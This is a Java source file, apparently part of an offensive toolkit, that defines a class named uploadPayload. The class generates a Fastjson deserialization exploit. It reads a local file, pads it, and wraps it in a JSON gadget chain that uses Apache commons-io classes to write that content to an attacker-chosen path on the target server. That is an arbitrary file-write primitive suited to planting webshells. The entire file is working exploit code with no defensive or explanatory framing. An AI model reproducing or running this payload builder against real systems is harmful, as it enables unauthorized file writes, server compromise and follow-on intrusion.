package com.ding0x0.fastjson;

import com.ding0x0.Payload;
import com.ding0x0.utils.Stream;

import java.io.IOException;

public class uploadPayload extends Payload {

    public String lfpath;
    public String rfpath;

    public String template = "{\n" +
            "  \"x\":{\n" +
            "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
            "    \"input\":{\n" +
            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
            "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
            "      \"reader\":{\n" +
            "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
            "        \"charSequence\":{\"@type\":\"java.lang.String\"\"%badcode%\"\n" +
            "      },\n" +
            "      \"charsetName\":\"UTF-8\",\n" +
            "      \"bufferSize\":1024\n" +
            "    },\n" +
            "    \"branch\":{\n" +
            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
            "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
            "      \"writer\":{\n" +
            "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
            "        \"file\":\"%rfpath%\",\n" +
            "        \"encoding\":\"UTF-8\",\n" +
            "        \"append\": false\n" +
            "      },\n" +
            "      \"charsetName\":\"UTF-8\",\n" +
            "      \"bufferSize\": 1024,\n" +
            "      \"writeImmediately\": true\n" +
            "    },\n" +
            "    %trigger%\n" +
            "  }\n" +
            "}";
    public String trigger = "\"trigger%index%\":{\n" +
            "    \"@type\":\"java.lang.AutoCloseable\",\n" +
            "    \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
            "    \"is\":{\n" +
            "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
            "    \"input\":{\n" +
            "        \"$ref\":\"$.input\"\n" +
            "    },\n" +
            "    \"branch\":{\n" +
            "        \"$ref\":\"$.branch\"\n" +
            "    },\n" +
            "    \"closeBranch\": true\n" +
            "    },\n" +
            "    \"httpContentType\":\"text/xml\",\n" +
            "    \"lenient\":false,\n" +
            "    \"defaultEncoding\":\"UTF-8\"\n" +
            "}";

    public uploadPayload(String lfpath, String rfpath){
        this.lfpath = lfpath;
        this.rfpath = rfpath;
    }

    public int count(String f){
        int l1 = f.length();
        String tmp = f.replace("\"","");
        int l2 = tmp.length();
        return l1-l2;
    }

    public String format() throws Exception {
        String badcode = Stream.F2S(this.lfpath);
        int replaceCount = count(badcode);
        badcode = badcode.replace("\"","\\\"");
        int cLength = badcode.length();
        if(cLength < 8192){
            int bufInt = (8193+replaceCount);
            String buf = new String(new char[bufInt+1]).replace('\0', 'f');
            badcode = badcode + buf;
        }
        int index = badcode.length() / 4096  + 1;
        StringBuilder buffer = new StringBuilder();
        for (int i = 0; i < index; i++) {
            String triggerBuf = this.trigger.replace("%index%", String.valueOf(i));
            buffer.append(triggerBuf);
            if(i != (index-1)) {
                buffer.append(",\n");
            }
        }
        String trigger = buffer.toString();
        return this.template.replace("%badcode%", badcode).replace("%trigger%", trigger).replace("%rfpath%",this.rfpath);
    }
}
